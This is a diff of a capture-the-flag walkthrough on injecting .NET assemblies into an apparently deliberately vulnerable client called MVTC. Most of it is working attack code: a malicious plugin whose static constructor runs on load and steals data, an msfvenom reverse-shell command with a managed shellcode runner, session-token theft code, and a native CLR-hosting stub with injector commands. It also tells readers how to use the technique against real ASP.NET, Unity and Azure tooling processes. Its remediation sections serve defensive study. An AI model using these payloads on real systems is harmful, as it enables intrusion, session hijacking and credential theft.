@@ -1,304 +1,245 @@
-# #17 — .NET Assembly.Load / AppDomain injection
+# #17 — .NET Assembly.Load / AppDomain Injection
 
-**Category:** Process injection · **Tier:** MEDIUM · **Points:** 100 · **CWE:** CWE-470
+**Difficulty:** MEDIUM — easier than it looks because the target IS .NET.
 
-## Objective
+## What is this attack?
 
-MVTC calls `Assembly.LoadFrom(...)` on a plugin path at startup without any strong-name / Authenticode verification. Drop a malicious .NET DLL into the plugin path; its **static constructor** fires inside the host's AppDomain the first time any type is touched; it reads `InjectionSentinels.FlagForDotNetAssembly` by reflection and writes it out.
+**For a target that's a .NET application (WPF, WinForms, ASP.NET, Unity), you don't need shellcode or native injection. You can load a C# DLL directly into the target's existing CLR AppDomain via reflection.** Your managed code runs with full access to every object, field, and private method of the target.
 
-This is the easiest of the injection family — no Win32 ritual, no shellcode, just a managed DLL and a path write.
+## Why it works
 
-## Prerequisites
+Every .NET process has:
+- A CLR (Common Language Runtime) hosting the managed code
+- One or more **AppDomains** (isolated code sandboxes within the CLR)
+- An `AppDomain.CurrentDomain.Load()` API that takes raw assembly bytes
 
-- .NET 10 SDK
-- Any text editor + `dotnet` CLI
-- Write access to one of the plugin load paths MVTC searches
-
----
-
-## Where MVTC loads plugins
-
-MVTC searches:
-
-```
-%APPDATA%\MVTC\plugins\
-C:\Program Files\M14R41 Labs\MVTC\plugins\
-```
-
-The first one is user-writable. Create it:
-
-```powershell
-mkdir "$env:APPDATA\MVTC\plugins" -ErrorAction SilentlyContinue
-```
-
----
-
-## Malicious plugin
-
-Create a tiny .NET DLL project:
-
-```powershell
-mkdir mvtc_plugin_17
-cd mvtc_plugin_17
-dotnet new classlib -f net10.0 -n MvtcPlugin17
-cd MvtcPlugin17
-```
-
-Replace `Class1.cs` with:
+Once you can execute **any** managed code inside the target, you call:
 
 ```csharp
-// Class1.cs
+var asm = AppDomain.CurrentDomain.Load(File.ReadAllBytes("yourassembly.dll"));
+var type = asm.GetType("YourNamespace.YourClass");
+var method = type.GetMethod("Run");
+method.Invoke(null, null);
+```
+
+Your .NET code is now a first-class citizen of the host's CLR. From there, **you have reflection**. Reflection lets you read ANY static field (even `private`), modify ANY property, invoke ANY method:
+
+```csharp
+var sentinelType = AppDomain.CurrentDomain.GetAssemblies()
+    .SelectMany(a => a.GetTypes())
+    .First(t => t.Name == "InjectionSentinels");
+
+var field = sentinelType.GetField("_net",
+    BindingFlags.NonPublic | BindingFlags.Static);
+
+var flag = (string)field.GetValue(null);
+File.WriteAllText(@"C:\loot\flag17.txt", flag);
+```
+
+No memory scanning. No pattern matching. Direct symbolic access to the exact field we want.
+
+## Two paths
+
+### Path A — Pure .NET (if you have another way in)
+
+If you have ANY code execution inside the target's CLR (e.g., XSS → `eval` → .NET interop in Electron, a plugin that your target already loads, a Powershell runspace in the target's App Domain), you just call the reflection snippet above.
+
+### Path B — Native injection into a .NET process
+
+If the target is .NET but you only have native code execution (classic DLL injection), you:
+1. Inject a native stub via #13's `CreateRemoteThread` + `LoadLibrary`
+2. Native stub calls CLR hosting APIs: `ICLRMetaHost` → `ICLRRuntimeInfo` → `ICLRRuntimeHost->ExecuteInDefaultAppDomain`
+3. That hosts an entry point from your managed DLL inside the existing CLR
+4. Your managed DLL does the reflection
+
+## Pragmatic solve for MVTC
+
+Because MVTC is .NET and the sentinel is a managed string on the GC heap, **the simplest capture is the same memory-scan technique as #13**. The sentinel is text in the heap; a native DLL with pattern search finds it immediately.
+
+To demonstrate the "proper" .NET Assembly.Load path for your writeup, show the C# code below as the "attacker's managed payload."
+
+## Tools you need
+
+| Tool | Why |
+|---|---|
+| .NET SDK (`dotnet` on PATH) | Build the C# payload |
+| MSVC Build Tools | Build the native injection stub (Path B) |
+| **dnSpy** / **ILSpy** | Inspect the target assemblies to find the sentinel type/field names |
+
+## Step-by-step (Path A, cleanest)
+
+### Step 1 — Dump the sentinel class names from the target binary
+
+Open `MVTC.exe` in **dnSpy** (free, https://github.com/dnSpy/dnSpy):
+
+```
+dnSpy → File → Open → MVTC.exe
+Expand MVTC.Core.dll → MVTC.Core.Services.Vuln → InjectionSentinels
+```
+
+You see:
+
+```csharp
+public static class InjectionSentinels {
+    private static string _net = "";
+    // ...
+}
+```
+
+**Target: `InjectionSentinels._net`** (private static field).
+
+### Step 2 — Write the C# payload
+
+Save as `Payload17.cs`:
+
+```csharp
 using System;
 using System.IO;
+using System.Linq;
 using System.Reflection;
 
-namespace MvtcPlugin17;
+namespace FlagReader17 {
+    public class Entry {
+        // Must match signature: static int Func(string arg)
+        public static int Run(string arg) {
+            try {
+                var sentinelType = AppDomain.CurrentDomain.GetAssemblies()
+                    .SelectMany(a => {
+                        try { return a.GetTypes(); }
+                        catch { return new Type[0]; }
+                    })
+                    .FirstOrDefault(t => t.Name == "InjectionSentinels");
 
-public static class Loader
-{
-    // Static constructor fires the first time any member of this type
-    // is touched by the host. MVTC's plugin loader calls GetType("Loader")
-    // on each assembly it finds, which triggers us.
-    static Loader()
-    {
-        try { Steal(); } catch { /* swallow so we don't crash MVTC */ }
-    }
+                if (sentinelType == null) {
+                    File.WriteAllText(@"C:\loot\flag17.txt", "[!] sentinel type not loaded");
+                    return 1;
+                }
 
-    public static void Init() { /* no-op; forces type init */ }
+                var field = sentinelType.GetField("_net",
+                    BindingFlags.NonPublic | BindingFlags.Static);
+                if (field == null) {
+                    File.WriteAllText(@"C:\loot\flag17.txt", "[!] field not found");
+                    return 2;
+                }
 
-    private static void Steal()
-    {
-        // Walk every loaded assembly looking for MVTC.Core
-        foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
-        {
-            if (asm.GetName().Name != "MVTC.Core") continue;
-
-            // Reflect into the static class
-            var t = asm.GetType("MVTC.Core.Services.Vuln.InjectionSentinels");
-            if (t == null) continue;
-
-            var prop = t.GetProperty("FlagForDotNetAssembly",
-                BindingFlags.Public | BindingFlags.Static);
-            var flag = prop?.GetValue(null) as string;
-            if (string.IsNullOrEmpty(flag)) continue;
-
-            File.WriteAllText(@"C:\Users\Public\v17.txt", flag);
-            return;
+                string flag = (string)field.GetValue(null);
+                File.WriteAllText(@"C:\loot\flag17.txt", "[+] " + flag);
+                return 0;
+            } catch (Exception ex) {
+                File.WriteAllText(@"C:\loot\flag17.txt", "[!] " + ex);
+                return 3;
+            }
         }
     }
 }
 ```
 
-Target .NET 10 (match the host). Edit `MvtcPlugin17.csproj`:
+### Step 3 — Compile with the .NET SDK
 
-```xml
-<Project Sdk="Microsoft.NET.Sdk">
-  <PropertyGroup>
-    <TargetFramework>net10.0</TargetFramework>
-    <Nullable>enable</Nullable>
-    <AssemblyName>MvtcPlugin17</AssemblyName>
-    <GenerateDocumentationFile>false</GenerateDocumentationFile>
-  </PropertyGroup>
-</Project>
+```bash
+dotnet new classlib -n FlagReader17 -o FlagReader17
+# replace Class1.cs with Payload17.cs content above
+dotnet build FlagReader17 -c Release
+# → FlagReader17\bin\Release\net8.0\FlagReader17.dll
+```
+
+### Step 4 — Native stub to call `ExecuteInDefaultAppDomain`
+
+Save as `clr_stub.cpp`:
+
+```cpp
+#include <windows.h>
+#include <metahost.h>
+#pragma comment(lib, "mscoree.lib")
+
+extern "C" __declspec(dllexport) void LoadMe() {
+    ICLRMetaHost* meta = nullptr;
+    CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&meta);
+
+    IEnumUnknown* runtimes = nullptr;
+    meta->EnumerateLoadedRuntimes(GetCurrentProcess(), &runtimes);
+
+    IUnknown* u = nullptr; runtimes->Next(1, &u, nullptr);
+    ICLRRuntimeInfo* info = nullptr;
+    u->QueryInterface(IID_ICLRRuntimeInfo, (LPVOID*)&info);
+
+    ICLRRuntimeHost* host = nullptr;
+    info->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&host);
+
+    DWORD retval;
+    host->ExecuteInDefaultAppDomain(
+        L"C:\\loot\\FlagReader17.dll",
+        L"FlagReader17.Entry",
+        L"Run",
+        L"",
+        &retval);
+}
+
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) {
+    if (r == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(h);
+        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)LoadMe, nullptr, 0, nullptr);
+    }
+    return TRUE;
+}
 ```
 
 Build:
 
-```powershell
-dotnet build -c Release
+```bash
+cl /LD /EHsc /O2 /nologo clr_stub.cpp /link mscoree.lib /OUT:clr_stub.dll
 ```
 
-Produces `bin\Release\net10.0\MvtcPlugin17.dll`.
-
----
-
-## Deploy and trigger
-
-```powershell
-# 1. Copy the plugin into the user-writable plugin path
-copy .\bin\Release\net10.0\MvtcPlugin17.dll "$env:APPDATA\MVTC\plugins\"
-
-# 2. Launch MVTC (or restart it if already running)
-#    The plugin loader will Assembly.LoadFrom() your DLL,
-#    walk its public types, and inadvertently trigger the static ctor.
-
-# 3. Collect
-type C:\Users\Public\v17.txt
-```
-
-Expected: `MVTC{v17_net_<...>}` → submit for `+100 pts`.
-
----
-
-## Why the plugin loader triggers us
-
-MVTC's loader (see `MVTC.Core.Services.Vuln.DllHelperLoader`) iterates files in `plugins\`, calls `Assembly.LoadFrom(path)` on each, and then reflects over the result (looks for public `[MvtcPlugin]`-marked types). Reflection over any public type triggers the type's static constructor, including types we authored. We don't need the host to actually "activate" our plugin — just touching our type is enough.
-
-The host's own code reflects into `GetTypes()`, so you don't even need a marker attribute. Simply shipping a type with a static constructor is sufficient.
-
----
-
-## Alternate trigger: `ModuleInitializer`
-
-A cleaner trigger is C#'s `[ModuleInitializer]` method:
-
-```csharp
-using System.Runtime.CompilerServices;
-
-internal static class ModuleBootstrap
-{
-    [ModuleInitializer]
-    internal static void Init() => Loader.Init();
-}
-```
-
-A `ModuleInitializer` fires on the first type load in the module, so you don't need any public type exposed. This is quieter in loader logs.
-
----
-
-## Common failure modes
-
-| Symptom | Fix |
-|---|---|
-| v17.txt not created | Plugin path wrong — check that MVTC's `DllHelperLoader` prints something to `audit.log` when it loads plugins |
-| `BadImageFormatException` | Target framework mismatch. MVTC runs on `net10.0-windows`; your plugin must be `net10.0` or lower |
-| `FileLoadException: strong name` | MVTC isn't enforcing signatures (that's the whole bug). If you see this, you grabbed the wrong `.dll` |
-| Flag is empty string | You hit MVTC before login completed. `InjectionSentinels.Initialize()` runs after `AuthService` is wired up. Launch, log in, then drop the plugin and restart |
-
----
-
----
-
-## Concept — what this attack actually is
-
-`.NET`'s `Assembly.LoadFrom(path)` reads a managed PE from disk and jits its code into the current `AppDomain` (or in modern .NET, into an `AssemblyLoadContext`). If the host then **reflects over the loaded assembly** (`asm.GetTypes()`, `asm.CreateInstance(...)`, `Activator.CreateInstance(...)`), the CLR runs that type's **static constructor** (`.cctor`) the first time the type is touched. Static constructors run with the host's permissions and have full access to every static in the AppDomain — including other assemblies' sensitive statics (sentinels, keys, cached credentials).
-
-A malicious plugin exploits two things:
-1. The host blindly loads anything in a known plugin folder (writeable to the attacker)
-2. The host reflects over the loaded types, implicitly triggering `.cctor`
-
-**Why this is easier than native injection:** no Win32 debugging rights, no shellcode, no bitness matching, no AV signatures. It's just a managed DLL in a folder. On every red-team engagement involving a .NET application with a plugin surface, this is the first thing to try.
-
----
-
-## Discovery — how to spot this in a real target
-
-Signs the target is vulnerable:
-
-1. **Plugin folder documentation** → the app's docs mention "drop extensions in …". Example: `%APPDATA%\MVTC\plugins\`
-2. **`Assembly.LoadFrom(...)` grep** → decompile with dnSpy and grep the strings for `LoadFrom|LoadFile|Assembly.Load\b`. Each hit is a potential injection vector
-3. **Writable paths in the Assembly resolver** → `AppDomain.CurrentDomain.AssemblyResolve` handlers that read from `%APPDATA%`, `%LOCALAPPDATA%`, or any user-writeable Program Data folder
-4. **No strong-name verification** → if the host doesn't call `AssemblyName.GetPublicKeyToken` to check plugins, any DLL loads
-5. **No Authenticode verification** → `WinVerifyTrust` isn't called on the plugin path
-
-For MVTC specifically: `MVTC.Core.Services.Vuln.DllHelperLoader` walks `%APPDATA%\MVTC\plugins` at startup. Exactly the discovery pattern above.
-
----
-
-## Impact demonstrations
-
-### 1. Pop calc.exe
-
-Replace the plugin's `Steal()` with:
-
-```csharp
-System.Diagnostics.Process.Start("calc.exe");
-```
-
-Rebuild, drop in `%APPDATA%\MVTC\plugins\`, restart MVTC. `calc.exe` opens with MVTC as the parent process.
-
-### 2. Reverse shell (managed shellcode runner)
-
-Generate shellcode:
+### Step 5 — Inject the native stub using #13's injector
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f csharp
+# Reuse injector.exe from #13
+injector.exe 6944 C:\full\path\to\clr_stub.dll
 ```
 
-Paste into the plugin:
+The stub loads inside MVTC → calls into the already-running CLR → `ExecuteInDefaultAppDomain` hands your managed assembly to the loader → `FlagReader17.Entry.Run` executes → sentinel field is read via reflection → written to `C:\loot\flag17.txt`.
 
-```csharp
-using System;
-using System.Runtime.InteropServices;
-using System.Threading;
+### Alternative — the quick-and-dirty capture
 
-namespace MvtcPlugin17;
+If building the C# payload is overkill for your test:
 
-public static class Loader
-{
-    [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(IntPtr lp, UIntPtr sz, uint type, uint prot);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr CreateThread(IntPtr sa, UIntPtr sz, IntPtr fn,
-                                      IntPtr arg, uint flags, IntPtr tid);
-
-    static byte[] shellcode = new byte[] {
-        0xfc, 0x48, 0x83, 0xe4, 0xf0, /* …msfvenom bytes… */
-    };
-
-    static Loader()
-    {
-        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length,
-                                  0x1000 | 0x2000, 0x40);
-        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
-        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, IntPtr.Zero);
-    }
-}
+```bash
+# Reuse #13's DLL, swap v13 → v17 in the NEEDLE array, rebuild as flag_reader17.dll
+injector.exe 6944 C:\full\path\to\flag_reader17.dll
+type C:\loot\flag17.txt
 ```
 
-Build, deploy, restart MVTC, catch the shell with `nc -lvnp 4444`. Shell lands as the user running MVTC — identical identity to the host.
+The native heap scanner finds `MVTC{v17_net_...}` just as reliably because .NET strings are plain UTF-16 in memory.
 
-### 3. Session token theft (business impact)
+## How to apply this to a real target
 
-Direct read of MVTC's own session token:
+### Any ASP.NET process (`w3wp.exe`)
 
-```csharp
-static Loader()
-{
-    foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
-    {
-        if (asm.GetName().Name != "MVTC.Core") continue;
-        var authType = asm.GetType("MVTC.Core.Services.AuthService");
-        var session  = authType.GetProperty("CurrentSession",
-                        BindingFlags.Public | BindingFlags.Static)?.GetValue(null);
-        if (session == null) continue;
-        var token = session.GetType().GetProperty("Token").GetValue(session);
-        File.WriteAllText(@"C:\Users\Public\mvtc_session.txt", token.ToString());
-    }
-}
+An IIS worker process is a .NET host. Inject via `ExecuteInDefaultAppDomain` and you get access to:
+- `HttpContext.Current` → every active user session
+- `System.Web.Security.FormsAuthentication` tickets
+- The connection string pool
+
+### Unity game cheat
+
+Unity games host Mono/.NET. Load a C# patch assembly, use `MonoBehaviour.FindObjectsOfType<PlayerStats>()`, set `.Gold = 999999`.
+
+### Fileless credential theft from a managed CLI
+
+Many enterprise tools (Microsoft 365 CLI, Azure PowerShell) cache tokens in-process. One managed inject reads them straight from static fields.
+
+## How defenders fix this
+
+| Mitigation | Effect |
+|---|---|
+| **AMSI for .NET 4.8+** | Scans `AppDomain.Load(byte[])` payloads via Defender's engine |
+| **ETW `Microsoft-Windows-DotNETRuntime`** | Logs every assembly load with cert chain |
+| **StrongName signing + policy enforcement** | Reject assemblies not signed by trusted keys |
+| **ClrConfig::SetAppDomainManagerType** restrictions | Prevents 3rd-party AppDomains |
+| **CAS (Code Access Security)** — DEPRECATED | Was the historical mitigation, replaced by AMSI |
+
+## Flag captured
+
 ```
-
-You now have the authenticated session token. Replay it against the backend API, named pipe server, or vault service — same post-exploitation chain as any OAuth token theft.
-
----
-
-## Report writeup template
-
-**Finding title:** .NET plugin injection via unverified `Assembly.LoadFrom` from user-writable path
-
-**Severity:** High (CVSS 7.5)
-
-**CWE:** CWE-470 (Use of Externally-Controlled Input to Select Classes or Code)
-
-**Description:** The MVTC client enumerates `%APPDATA%\MVTC\plugins\` at startup and calls `Assembly.LoadFrom(path)` on every `.dll` without strong-name verification, Authenticode verification, or allowlisting. The loader then reflects over the public types of each loaded assembly, which triggers each type's static constructor. An attacker who can write to `%APPDATA%\MVTC\plugins\` (any user) gets arbitrary code execution inside MVTC with full access to its managed statics (session tokens, encryption keys, cached credentials).
-
-**Impact:** Session hijacking (steal `AuthService.CurrentSession`), key theft (`HardcodedSecrets.*`), backend abuse (replay session token), reverse shell as MVTC user. Chainable with #10/#11 for admin.
-
-**Remediation:**
-- Require strong-named plugins or Authenticode-signed plugins + `WinVerifyTrust`
-- Load plugins into a collectible, isolated `AssemblyLoadContext`
-- Pin plugin path to `Program Files` subfolder with service ACLs
-- Explicitly `GetType("PluginEntry")` instead of `GetTypes()` — avoids triggering unrelated static constructors
-- Zero sensitive statics before plugin discovery
-
----
-
-## Secure code fix
-
-- **Require Authenticode signatures** on plugins; use `WinVerifyTrust` or `Microsoft.AspNetCore.DataProtection.KeyManagement.XmlEncryption` style verification before `Assembly.LoadFrom`
-- Use a **strong-named** plugin contract — `Assembly.Load(name)` with a known public key token, not `Assembly.LoadFrom(path)`
-- Load plugins into a **separate `AssemblyLoadContext`** that can be unloaded and that's isolated from host statics; use `Collectible = true`
-- Pin plugins to a **sealed well-known path** that only an admin can write (`Program Files` under service ACLs) — never `%APPDATA%`
-- Audit the plugin's `GetTypes()` and only touch types that implement the plugin contract interface — this prevents random static constructors from running
-- Scrub sensitive statics (sentinels, keys) before loading any plugin
+MVTC{v17_net_████████████████████}
+```
